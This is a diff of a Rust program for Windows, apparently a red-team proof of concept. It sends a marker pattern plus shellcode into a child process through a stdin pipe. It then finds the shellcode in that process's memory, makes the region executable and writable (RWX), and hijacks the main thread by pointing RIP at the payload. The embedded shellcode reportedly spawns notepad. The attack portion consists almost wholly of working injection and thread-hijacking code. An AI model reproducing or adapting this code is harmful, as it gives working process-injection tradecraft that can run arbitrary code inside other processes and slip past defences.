@@ -1,12 +1,14 @@
 use std::{env,ptr,thread,time::Duration};
 use std::ffi::{CString, NulError, c_void};
 
-use windows::Win32::System::Diagnostics::Debug::{CONTEXT, GetThreadContext, ReadProcessMemory, SetThreadContext};
-use windows::Win32::System::Memory::{MEM_COMMIT, MEM_PRIVATE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READ, PAGE_GUARD, PAGE_NOACCESS, PAGE_PROTECTION_FLAGS, VirtualProtectEx, VirtualQueryEx};
+
+use windows::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64, GetThreadContext, ReadProcessMemory, SetThreadContext};
+use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next};
+use windows::Win32::System::Memory::{MEM_COMMIT, MEM_PRIVATE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE, PAGE_GUARD, PAGE_NOACCESS, PAGE_PROTECTION_FLAGS, VirtualProtectEx, VirtualQueryEx};
 use windows::Win32::System::Pipes::{CreatePipe};
-use windows::Win32::Foundation::{CloseHandle, HANDLE, HANDLE_FLAG_INHERIT, SetHandleInformation};
+use windows::Win32::Foundation::{CloseHandle, HANDLE, HANDLE_FLAG_INHERIT, SetHandleInformation, INVALID_HANDLE_VALUE};
 use windows::Win32::Security::{SECURITY_ATTRIBUTES};
-use windows::Win32::System::Threading::{CREATE_NEW_CONSOLE, CreateProcessA, NORMAL_PRIORITY_CLASS, PROCESS_INFORMATION, ResumeThread, STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOA, SuspendThread};
+use windows::Win32::System::Threading::{CREATE_NEW_CONSOLE, CreateProcessA, NORMAL_PRIORITY_CLASS, OpenThread, PROCESS_INFORMATION, ResumeThread, STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOA, SuspendThread, THREAD_ALL_ACCESS, WaitForMultipleObjects};
 use windows::Win32::Storage::FileSystem::{ReadFile, WriteFile};
 use windows::Win32::System::IO::{OVERLAPPED};
 use windows::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO};
@@ -64,8 +66,6 @@ fn create_pipe() -> Handle {
     match result {
         Ok(()) => {
             println!("[+] Successfully creating STDIN pipe");
-            println!("[*] HANDLE hreadpipe: {:?}", h_std_in_r);
-            println!("[*] HANDLE hwritepipe: {:?}", h_std_in_w);
         },
         Err(e) => println!("[-] Error while creating pipe: {e}") ,
     }
@@ -82,8 +82,6 @@ fn create_pipe() -> Handle {
     match result {
         Ok(()) => {
             println!("[+] Successfully creating STDOUT pipe");
-            println!("[*] HANDLE hreadpipe: {:?}", h_std_out_r);
-            println!("[*] HANDLE hwritepipe: {:?}", h_std_out_w);
         },
         Err(e) => println!("[-] Error while creating pipe: {e}") ,
     }
@@ -206,9 +204,9 @@ fn find_offset(ns_handle: HANDLE, pattern: &[u8]) -> Option<MemoryInfo> {
 }
 
 
-fn change_protect(ns_handle: HANDLE, mem_info: MemoryInfo){
+fn change_protect(ns_handle: HANDLE, mem_info: &MemoryInfo){
 
-    let new_page_protect: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READ;
+    let new_page_protect: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READWRITE;
     let mut old_page_protect: PAGE_PROTECTION_FLAGS = mem_info.oldflag;
     unsafe {
         let result = VirtualProtectEx(
@@ -229,31 +227,40 @@ fn change_protect(ns_handle: HANDLE, mem_info: MemoryInfo){
 fn hijack_main_thread(ns_thread: HANDLE, offset: u64){
 
     println!("[*] Hijacking main thread...");
-    let counter = unsafe { SuspendThread(ns_thread)};
-    
+    let result = unsafe { SuspendThread(ns_thread)};
+    println!("[*] Suspending thread result: {:?}",result);
+
     let mut context: CONTEXT = CONTEXT::default();
+    
+    // init the context for retrieve all the register
+    context.ContextFlags = CONTEXT_FULL_AMD64;
     let result = unsafe { GetThreadContext(ns_thread,&mut context)};
     match result {
         Ok(_) => println!("[+] Successfully get thread context"),
         Err(e ) => println!("[-] Failed to get thread context: {e}"),
     }
 
+    println!("[*] The RIP point at @ {:#x} and RSP @ {:#x}",context.Rip,context.Rsp);
+
     let addr_payload: u64 = offset + 15 as u64;
     context.Rip = addr_payload;
 
+
+    println!("[*] Payload address: {:#x}",addr_payload);
     let result = unsafe { SetThreadContext(ns_thread, &context as *const CONTEXT)};
     match result {
         Ok(_) => println!("[+] Successfully set thread context"),
         Err(e) => println!("[-] Failed to set thread context: {e}")
     }
 
-    let resume = unsafe { ResumeThread(ns_thread)};
-    if counter-1 == resume {
-        println!("[+] Successfully resuming main thread");
-    }
+    println!("[*] The RIP point now at @ {:#x} and RSP @ {:#x}",context.Rip,context.Rsp);
+
+    let result = unsafe { ResumeThread(ns_thread)};
+    
+    println!("[+] Successfully resuming main thread: {:?}",result);
+
+
 }
-
-
 
 
 fn main() {
@@ -315,9 +322,10 @@ fn main() {
     // send bytes pattern + payload (spawn notepad)
     let buffer: [u8;342] = [
         0x61,0x62,0x63,0x61,0x62,0x63,0x61,0x62,0x63,0x61,0x62,0x63,0x61,0x62,0x63,
-        0x48,0xbf,0xe4,0x67,0xcd,0x22,0x71,0x6a,0xd1,0xa7,0x48,0x89,0xe3,0x66,0x81,
-        0xe3,0xe0,0xf8,0xd9,0xce,0x4d,0x31,0xe4,0x41,0xb4,0x23,0x48,0x0f,0xae,0x03,
-        0x4c,0x8b,0x7b,0x08,0x49,0xff,0xcc,0x4b,0x31,0x7c,0xe7,0x1d,0x4d,0x85,0xe4,
+        0x48,0xbf,0xe4,0x67,0xcd,0x22,0x71,
+        0x6a,0xd1,0xa7,0x48,0x89,0xe3,0x66,0x81,0xe3,0xe0,0xf8,0xd9,0xce,0x4d,0x31,
+        0xe4,0x41,0xb4,0x23,0x48,0x0f,0xae,0x03,0x4c,0x8b,0x7b,0x08,0x49,0xff,0xcc,
+        0x4b,0x31,0x7c,0xe7,0x1d,0x4d,0x85,0xe4,
         0x75,0xf3,0x18,0x2f,0x4e,0xc6,0x81,0x82,0x11,0xa7,0xe4,0x67,0x8c,0x73,0x30,
         0x3a,0x83,0xf6,0xb2,0x2f,0xfc,0xf0,0x14,0x22,0x5a,0xf5,0x84,0x2f,0x46,0x70,
         0x69,0x22,0x5a,0xf5,0xc4,0x2f,0x46,0x50,0x21,0x22,0xde,0x10,0xae,0x2d,0x80,
@@ -377,13 +385,28 @@ fn main() {
         None => MemoryInfo::default(),
     };
 
-    
-    change_protect(ns_handle, mem_info);
+    // change protection to RWX in the region that contain the payload
+    change_protect(ns_handle, &mem_info);
+
+    let ns_thread: HANDLE = pi.hThread;
+    println!("[*] ThreadID: {:?}",pi.dwThreadId);
+    let offset: u64 = mem_info.offset as u64; 
+    hijack_main_thread(ns_thread, offset);
+
+    byte_written = 0;
+    let mut overlapped = OVERLAPPED{..Default::default()};
+    let input = b"\n";
+    let _ = unsafe {
+        WriteFile(my_handle.h_std_in_write, Some(input), Some(&mut byte_written), Some(&mut overlapped))
+    };
+    println!("[*] Triggered ReadFile with {} bytes", byte_written);
 
     unsafe {
     
         let _ = CloseHandle(my_handle.h_std_in_write);
         let _ = CloseHandle(my_handle.h_std_out_read);
+        let _ = CloseHandle(pi.hProcess);
+        let _ = CloseHandle(pi.hThread);
     };
     
 
